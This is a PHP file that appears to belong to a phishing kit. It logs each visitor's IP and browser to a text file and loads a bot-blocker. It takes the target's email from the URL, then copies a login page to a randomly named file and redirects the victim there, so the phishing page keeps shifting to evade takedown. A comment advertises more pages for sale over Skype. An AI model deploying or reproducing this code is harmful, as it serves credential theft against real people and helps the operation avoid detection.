<?php

/* Visitor Result */
error_reporting(0);include('blocker.php');
$botelite = getenv("REMOTE_ADDR");$botbrowser = $_SERVER['HTTP_USER_AGENT'];$botdate = date("D M d, Y g:i a");
$botdata = "
+ --------------------------------------------------------------+
| Visitor Information
| IP Address: $botelite
| Country: $botnegara 
| Browser: $botbrowser
| Date: $botdate 
+ --------------------------------------------------------------+
";
if($visitor==1) { $file=fopen("./data.txt","a"); fwrite($file,$botdata);fclose($file); }
function random_number(){
	$numbers=array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key=array_rand($numbers);
	return $numbers[$key]; }
$url=random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
header('location:'.$url);

/* Autodetected Email */
$email = $_GET['id'];
$dir =  getcwd();
if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
 $len = strlen($entry);
if($len == 28){
rename($entry, "login.php");
}}}
$staticfile = "login.php";
$name =  generateRandomString();
$theplayer = $name.".php";
if (!copy($staticfile, $theplayer)) {
//echo "file not create\n";
}else {
if(file_exists($theplayer)){
//echo "file exist\n";
unlink($staticfile);
header("Location: $theplayer?$url&id=$email");
}}

//echo $_SESSION["file"]."\n";
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

/* 
Need More page

Skype: Mircboot
*/

?>
